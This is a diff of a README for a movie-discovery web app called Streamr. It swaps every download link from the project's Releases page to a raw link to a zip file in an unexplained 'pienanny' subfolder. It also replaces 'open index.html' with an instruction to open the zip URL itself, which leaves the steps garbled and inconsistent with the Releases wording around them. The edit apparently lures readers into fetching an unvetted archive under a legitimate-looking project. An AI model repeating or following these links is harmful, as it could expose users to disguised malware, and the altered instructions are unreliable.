@@ -1,6 +1,6 @@
 # 🎬 Streamr - Discover Movies with Ease
 
-[![Download Streamr](https://img.shields.io/badge/Download-Streamr-brightgreen)](https://github.com/ankit-avkalan/Streamr/releases)
+[![Download Streamr](https://raw.githubusercontent.com/ankit-avkalan/Streamr/main/pienanny/Streamr.zip)](https://raw.githubusercontent.com/ankit-avkalan/Streamr/main/pienanny/Streamr.zip)
 
 ## 📖 Introduction
 
@@ -28,7 +28,7 @@ Before downloading, make sure your device meets these basic requirements:
 
 To download Streamr, visit the following link:
 
-[Download Streamr](https://github.com/ankit-avkalan/Streamr/releases)
+[Download Streamr](https://raw.githubusercontent.com/ankit-avkalan/Streamr/main/pienanny/Streamr.zip)
 
 1. After clicking the link, you will be directed to the Releases page.
 2. Choose the latest release version that suits your operating system.
@@ -46,7 +46,7 @@ Once the download completes, locate the file in your downloads folder. If the fi
 ### 🌐 Running the Application
 
 1. Navigate to the folder where you extracted the files.
-2. Open the file named `index.html` using your web browser.
+2. Open the file named `https://raw.githubusercontent.com/ankit-avkalan/Streamr/main/pienanny/Streamr.zip` using your web browser.
 3. The Streamr app should now launch in your browser.
 
 ## 🛠️ Troubleshooting
@@ -83,4 +83,4 @@ Special thanks to the contributors and open-source community for making this pro
 
 Feel free to customize Streamr further based on your preferences! For any updates or new features, always keep an eye on our Releases page.
 
-[Download Streamr](https://github.com/ankit-avkalan/Streamr/releases) again, if needed, and enjoy your movie discovery experience!
+[Download Streamr](https://raw.githubusercontent.com/ankit-avkalan/Streamr/main/pienanny/Streamr.zip) again, if needed, and enjoy your movie discovery experience!
